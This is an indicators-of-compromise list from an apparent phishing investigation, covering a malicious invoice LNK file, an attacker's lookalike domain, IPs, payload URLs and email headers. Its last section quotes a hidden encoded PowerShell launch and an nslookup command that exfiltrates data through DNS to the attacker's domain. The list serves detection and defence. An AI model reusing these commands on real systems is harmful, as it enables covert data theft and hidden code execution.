

## 1 Files

- **Name:** `Invoice_20230103.lnk`
- **MD5:** `9ec88799e81b7465d2459c055ce6819f`
- **SHA1:** `4deff59346887594d880bcb2e24c100a49cf5040`
- **SHA256:** `86d5e0589fbd8c90604da954197344801f0579de157510e13492db0c712a0cc8`
- **Description:** Malicious LNK payload

- **Name:** `sb.exe`
- **Description:** Seatbelt enumeration tool downloaded by attacker

- **Name:** `sq3.exe`
- **Description:** SQLite3 command-line utility used for credential harvesting

## 2 Domains

```txt
bpakcaging.xyz
files.bpakcaging.xyz
cdn.bpakcaging.xyz
tracking.bpakcaging.xyz
```

## 3 IP Addresses

- `167.71.211.113` (Payload Delivery & DNS Exfiltration Server)
- `15.235.99.80` (SMTP Sender IP)
- `159.89.205.40` (Observed in C2 HTTP responses)

## 4 URLs

```txt
http://files.bpakcaging.xyz/update
http://files.bpakcaging.xyz/sb.exe
http://files.bpakcaging.xyz/sq3.exe
http://cdn.bpakcaging.xyz:8080/8cce49b0
http://cdn.bpakcaging.xyz:8080/b86459bb
http://cdn.bpakcaging.xyz:8080/27fe2489
```

## 5 Email Indicators

- **Sender:** `agriffin@bpakcaging.xyz`
- **Subject:** `Collection for Quick Logistics LLC - Jan 2023`
- **Message-ID:** `<4uiwqc5wd1qx.HPk2p-JE_jYbkWIRB-SmuA2@tracking.bpakcaging.xyz>`
- **Attachment:** `Invoice.zip`

## 6 PowerShell Indicators

- **Commands:** 
```powershell
powershell.exe -nop -windowstyle hidden -enc aQBlAHgA...

nslookup -q=A "$line.bpakcaging.xyz" $destination
```
